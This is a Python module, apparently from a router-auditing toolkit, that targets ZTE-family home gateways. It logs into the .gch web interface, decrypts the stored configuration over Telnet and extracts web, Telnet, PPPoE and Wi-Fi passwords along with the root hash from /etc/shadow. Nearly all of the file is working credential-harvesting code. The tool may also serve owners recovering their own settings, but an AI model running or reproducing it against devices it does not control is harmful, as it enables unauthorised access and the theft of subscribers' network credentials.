# -*- coding: utf-8 -*-
"""中兴系 Web（.gch 框架）：登录、枚举页面、解密配置、提取凭据。

适用：ZXHN G7615、九联 UNG220Z / UNG853H、吉比特 H3-2 等 ZTE 固件系。
注意：不同厂商默认端口不同（中兴 8080，九联/吉比特多为 80）。
"""
import base64
import html as html_mod
import re

from .core import Http, Telnet, log

CFG_ENC = "/userconfig/cfg/db_user_cfg.xml"
CFG_DEC = "/tmp/debug-decry-cfg"


def _unescape(v):
    """还原 JS 的 \\xNN 转义与 HTML 实体。"""
    v = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), v)
    return html_mod.unescape(v)


class ZteWeb:
    def __init__(self, host, port=80, user="user", password="", timeout=8):
        self.base = "http://%s" % host if port in (80, None) else "http://%s:%d" % (host, port)
        self.host, self.port = host, port
        self.user, self.password = user, password
        self.http = Http(self.base, timeout)

    @staticmethod
    def _token(html):
        m = re.search(r'Frm_Logintoken"\)\.value\s*=\s*"(\d+)"', html)
        return m.group(1) if m else "7"

    def login(self):
        html, _ = self.http.get("/")
        token = self._token(html)
        body, _ = self.http.post_form("/", {
            "username": self.user,
            "logincode": base64.b64encode(self.password.encode()).decode(),
            "textpwd": "", "frashnum": "", "ieversion": "1",
            "Frm_Logintoken": token, "action": "login",
        })
        if 'name="logincode"' not in body and len(body) > 5000:
            log("AUTH", "%s 登录成功（%s）" % (self.user, self.base))
            return True
        if "其他用户" in body:
            log("WARN", "设备提示「其他用户正在配置」，先释放会话再试")
        elif len(re.findall(r'errmsg"\)\.innerHTML = "([^"]*)"', body)) > 1:
            log("WARN", "登录次数超限，设备处于延时校验")
        else:
            log("WARN", "登录失败：账号或密码错误")
        return False

    def page(self, name):
        body, _ = self.http.get("/getpage.gch?pid=1002&nextpage=" + name)
        return "" if "页面超时" in body else body

    def pages(self):
        tmpl = self.page("template.gch")
        return sorted(set(re.findall(r"nextpage=([A-Za-z0-9_.]+\.gch)", tmpl)))

    @staticmethod
    def values(html):
        """解析 Transfer_meaning 键值；设备常把 @ 写成 \\x40，需还原。"""
        out = {}
        for k, v in re.findall(r"Transfer_meaning\('([A-Za-z_0-9]+)','((?:[^'\\]|\\.)*)'\)", html):
            if v and not k.startswith("IF_"):
                out[k] = _unescape(v)
        return out

    @staticmethod
    def rows(html):
        out = []
        for tr in re.findall(r"<tr[^>]*>(.*?)</tr>", html, re.S):
            cells = [_unescape(re.sub(r"<[^>]+>", "", c)).strip()
                     for c in re.findall(r"<td[^>]*>(.*?)</td>", tr, re.S)]
            cells = [c for c in cells if c]
            if len(cells) >= 2:
                out.append(cells)
        return out


# ───────────────────── 通过 Telnet 读配置 ─────────────────────
def decrypt_config(tn):
    tn.run("sidbg 1 DB decry %s" % CFG_ENC)
    if not tn.run("ls %s" % CFG_DEC).strip():
        log("WARN", "配置解密失败（%s 不存在）" % CFG_DEC)
        return False
    log("SHELL", "sidbg 1 DB decry → %s" % CFG_DEC)
    return True


def table(tn, name):
    out = tn.run("sed -n '/<Tbl name=\"%s\"/,/<\\/Tbl>/p' %s" % (name, CFG_DEC))
    rows = []
    for blk in re.findall(r'<Row No="\d+">(.*?)</Row>', out, re.S):
        rows.append(dict(re.findall(r'<DM name="([A-Za-z_0-9]+)" val="([^"]*)"', blk)))
    return rows


def extract_credentials(tn):
    """返回 dict：web / telnet / pppoe / wifi / root。"""
    creds = {"web": [], "telnet": [], "pppoe": [], "wifi": []}
    for r in table(tn, "DevAuthInfo"):
        if r.get("User"):
            creds["web"].append((r["User"], r.get("Pass", ""), r.get("Level", "")))
            log("DATA", "Web 账号 %-12s %s  Level=%s" % (r["User"], r.get("Pass"), r.get("Level")))
    for r in table(tn, "TelnetUser"):
        if r.get("Username"):
            creds["telnet"].append((r["Username"], r.get("Password", "")))
            log("DATA", "Telnet   %-12s %s" % (r.get("Username"), r.get("Password")))
    for r in table(tn, "WANCPPP"):
        if r.get("UserName"):
            creds["pppoe"].append((r["UserName"], r.get("Password", "")))
            log("DATA", "PPPoE    %-12s %s" % (r["UserName"], r.get("Password")))
    for r in table(tn, "WLANPSK"):
        if r.get("KeyPassphrase"):
            creds["wifi"].append((r.get("ViewName", ""), r["KeyPassphrase"]))
            log("DATA", "WiFi     %-24s %s" % (r.get("ViewName"), r["KeyPassphrase"]))
    shadow = tn.run("grep root /etc/shadow | head -1")
    m = re.search(r"root:(\$[0-9]\$[^:]+):", shadow)
    if m:
        creds["root"] = m.group(1)
        log("DATA", "root 哈希 %s" % m.group(1)[:40])
    return creds
